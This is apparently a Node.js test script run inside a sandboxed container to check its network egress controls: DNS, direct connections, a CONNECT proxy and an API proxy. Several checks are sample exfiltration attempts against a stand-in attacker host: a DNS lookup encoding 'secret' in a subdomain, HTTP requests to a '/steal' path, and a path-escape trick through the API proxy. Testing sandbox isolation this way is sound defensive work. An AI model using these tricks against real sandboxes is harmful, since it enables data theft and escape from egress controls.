// Runs inside a box for the Podman test. Prints one JSON object of outcomes.
import dns from "node:dns/promises";
import http from "node:http";
import net from "node:net";

const [proxy, attacker] = process.argv.slice(2);

const settle = (promise) =>
  promise.then(
    (value) => value,
    (error) => `error ${error.code ?? error.message}`,
  );

const withTimeout = (promise, ms = 5000) =>
  Promise.race([promise, new Promise((resolve) => setTimeout(() => resolve("timeout"), ms))]);

function connectVia(authority) {
  return new Promise((resolve, reject) => {
    const socket = net.connect(3128, proxy, () =>
      socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`),
    );
    socket.setEncoding("utf8");
    socket.once("data", (chunk) => {
      resolve(chunk.split("\r\n")[0]);
      socket.destroy();
    });
    socket.on("error", reject);
  });
}

function direct(host, port) {
  return new Promise((resolve, reject) => {
    const socket = net.connect(port, host, () => {
      socket.destroy();
      resolve("connected");
    });
    socket.on("error", reject);
  });
}

function api(port, path, headers = {}) {
  return new Promise((resolve, reject) => {
    const request = http.request({ host: proxy, port, path, headers, agent: false }, (response) => {
      response.resume();
      response.on("end", () => resolve(response.statusCode));
    });
    request.on("error", reject);
    request.end();
  });
}

const checks = {
  dnsAllowed: () => dns.resolve4("api.anthropic.com"),
  dnsOther: () => dns.resolve4("pypi.org"),
  dnsExfil: () => dns.resolveTxt("exfil-c2VjcmV0.attacker.example"),
  directPublic: () => direct("1.1.1.1", 443),
  directDns: () => direct("8.8.8.8", 53),
  directAttacker: () => direct(attacker, 9000),
  connectAllowed: () => connectVia("example.com:443"),
  connectGithub: () => connectVia("github.com:443"),
  connectLoopbackName: () => connectVia("localtest.me:443"),
  connectAttacker: () => connectVia(`${attacker}:9000`),
  connectPort: () => connectVia("example.com:22"),
  plainHttp: () => api(3128, `http://${attacker}:9000/steal`),
  apiLane: () => api(8080, "/anthropic/v1/messages", { "x-api-key": "box-placeholder" }),
  apiEscape: () => api(8080, `/anthropic//${attacker}:9000/steal`),
  apiOtherVendor: () => api(8080, `/openai/v1/responses`),
};

const results = {};
for (const [name, check] of Object.entries(checks)) {
  results[name] = await withTimeout(settle(check()));
}
process.stdout.write(`${JSON.stringify(results)}\n`);
